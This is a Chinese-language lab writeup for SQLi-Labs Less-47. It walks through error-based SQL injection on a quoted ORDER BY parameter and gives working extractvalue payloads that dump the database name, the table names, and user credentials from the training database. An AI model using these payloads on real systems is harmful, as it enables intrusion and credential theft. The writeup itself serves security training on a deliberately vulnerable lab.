【SQLi-Labs】Less-47 ORDER BY 字符型报错注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, ORDER BY注入, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-47 (GET - Error Based - String - ORDER BY)
  • 提示：注入点为 sort 参数，字符型闭合（带单引号），有报错回显。

2. 核心原理与前置分析

本关卡与 L46 类似，注入点位于 ORDER BY 后。由于无法使用 UNION 联合查询，依然采用报错注入。

核心区别：源码结构为 ORDER BY '$id'。由于被单引号包裹，必须先用 ' 闭合字符串，再用逻辑符（如 and）拼接报错函数，最后注释掉尾部的引号。

3. 操作步骤与解析

第一步：闭合与爆库名

输入 URL：?sort=1' and extractvalue(1,concat(0x7e,database()))-- -

回显现象：XPATH syntax error: '~security'。

解释与原理：输入 1' 闭合原语句，and extractvalue(...) 执行报错函数，-- - 注释掉后续的引号。

第二步：爆表名

输入 URL：?sort=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))-- -

回显现象：~emails,referers,uagents,users。

第三步：分段拿账号密码

输入 URL：?sort=1' and extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),1,30) from users)))-- -

回显现象：~Dumb:Dumb,Angelina:I-kill-you,。

4. 踩坑记录与复盘

  • 区分上下文：L46 是纯数字，直接执行函数；L47 是字符型，必须闭合引号。不要被页面提示的 "numeric value" 欺骗。
  • 报错截断：数据超过 32 字符会被截断，需修改 substr 的起始位置来获取后续数据。

5. 知识点总结

  • ORDER BY 字符型注入：通过闭合单引号，将函数执行结果转化为排序表达式。
